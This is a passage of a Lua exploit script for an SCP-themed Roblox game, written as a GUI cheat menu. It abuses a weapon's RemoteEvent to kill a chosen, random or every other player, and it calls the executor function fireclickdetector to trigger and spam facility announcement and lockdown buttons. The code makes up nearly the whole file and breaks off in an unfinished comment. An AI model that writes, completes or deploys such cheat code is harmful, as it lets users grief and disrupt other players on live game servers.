LOG.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
-- Scripts:
function SCRIPT_ZEDQ79_FAKESCRIPT() -- MainMenu.LocalScript 
local script = Instance.new('LocalScript')
script.Parent = MainMenu
--this will provide your exploit with some functions that you can use to make it look more fleshed out.

--shows up in chat
--RGB should be an array
function MSG(msg, RGB, font)
local msg_color = Color3.fromRGB(RGB[1], RGB[2], RGB[3])

game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
       Text = msg;
       Color = msg_color; -- {0-255, 0-255, 0-255}
       Font = font; --Arcade, Cartoon, Arial, Legacy, ArialBold, Bodoni, Garamond, SciFi
   })
end

function Notify(title,text,duration,icon,func,BTN,BTN2)

game.StarterGui:SetCore("SendNotification", {Title=title,Text=text,Icon=icon,Duration=duration,Callback=func,Button1=BTN,Button2=BTN2})
end


Mbtns = {"Breach","Blackout","HCZLock","MCZ","CI","Breach2","Riot","NTF"}
buttonList = {"ContainmentBreachAnnouncementButtons1","SiteBlackoutButtons","HCZLockdownButtons","MCZBreachAlarmButtons","ChaosInsurgencyBreachAlarmButtons","ContainmentBreachAnnouncementButtons2","ClassDRiotAnnouncementButtons","NineTailedFoxAnnouncementButtons"}
Sbtns = {false,false,false,false,false,false,false,false}



local Event = nil

function Remotecheck()
--expand to holding item
if game.Players.LocalPlayer.Backpack:FindFirstChild("P90") == nil then
Notify("ERROR","No P90 detected",1)
return false
else
Event = game.Players.LocalPlayer.Backpack.P90.RemoteEvent
return true
end
end

function btn(d,m)
fireclickdetector(game.workspace[m].play.ClickDetector)
wait(d)
fireclickdetector(game.workspace[m].stop.ClickDetector)
wait(d) 
end
function play(m)
fireclickdetector(game.workspace[m].play.ClickDetector)
end
function stop (m)
fireclickdetector(game.workspace[m].stop.ClickDetector)
end



--kill rnd, all, target
function Kill(plr)
if Remotecheck() == false then
return
end
local A_1 = "Fire"
local A_2 = plr.Character["HumanoidRootPart"]
for i=0, 25 do
Event:FireServer(A_1, A_2)
end
end

--button Vars
local S173 = false
local S049 = false
local S106 = false


local mode = "nil"
--buttons
com = script.Parent.MainPart.Command
btns = script.Parent.MainPart.ButtonList
--main
com.Buttons.On.MouseButton1Click:connect(function()
if mode == "Kill" then
if KillRnd then
t = game.Players:GetChildren()[math.random(#game.Players:GetChildren())]
if t ~= game.Players.LocalPlayer then
Kill(t)
end
end
if KillAll then
for index, child in pairs(game.Players:GetChildren()) do
if child ~= game.Players.LocalPlayer then
Kill(child)
end
end 
end
if KillTar then
target = com.Buttons.Kill.TextBox.Text
if game.Players:FindFirstChild(target) ~= nil then
Kill(game.Players:FindFirstChild(target))
else
com.Buttons.Kill.TextBox.Text = "NOT FOUND"
end

end
end

for i,v in pairs(Mbtns) do
if mode == v then
if manual then
play(buttonList[i])
end
if spam then
spawn(function()
while spam == true do
wait(0.01)
btn(globDelay,buttonList[i])
end
end)
end
if playOnce then
if game:FindFirstChild(buttonList[i]):FindFirstChildOfClass("Sound") ~= nil then
play(buttonList[i])
wait(game:FindFirstChild(buttonList[i]):FindFirstChildOfClass("Sound").TimeLength)
stop(buttonList[i])
else
play(buttonList[i])
end
end
end
end

end)
com.Buttons.Off.MouseButton1Click:connect(function()
for i,v in pairs(Mbtns) do
if mode == v then
stop(buttonList[i])
end
end
end)
--red
KillRnd = false
KillAll = false
KillTar = false
spam = false
globDelay = 1
playOnce = false
manual = true

btns.Kill.MouseButton1Click:connect(function()
mode = "Kill"
com.Title.Command_Name.Text = "Kill"
com.Buttons.Kill.Visible = true
com.Buttons.Announce.Visible = false
com.Buttons.Nil.Visible = false
com.Buttons.SCP.Visible = false
end)

btns.SCP.MouseButton1Click:connect(function()
mode = "SCP"
com.Title.Command_Name.Text = "SCP move"
com.Buttons.Kill.Visible = false
com.Buttons.Announce.Visible = false
com.Buttons.Nil.Visible = false
com.Buttons.SCP.Visible = true
end)

com.Buttons.Kill.Player.MouseButton1Click:Connect(function()
KillRnd = false
KillTar = true
KillAll = false
com.Buttons.Kill.TextLabel.Text = "Mode:Player"
end)

com.Buttons.Kill.Random.MouseButton1Click:Connect(function()
KillRnd = true
KillTar = false
KillAll = false
com.Buttons.Kill.TextLabel.Text = "Mode:Random"
end)

com.Buttons.Kill.All.MouseButton1Click:Connect(function()
KillRnd = false
KillTar = false
KillAll = true
com.Buttons.Kill.TextLabel.Text = "Mode:All"
end)

--green

--data
local data
function newFolder(n)
f = Instance.new("Folder")
f.Parent = data
f.Name = n
return f
end

function newEntry(p,t,s,d)
v = Instance.new(t)
v.Value = d
v.Parent = p
v.Name = s
end


--[[
if game.ReplicatedStorage:FindFirstChild("S17D") == nil then
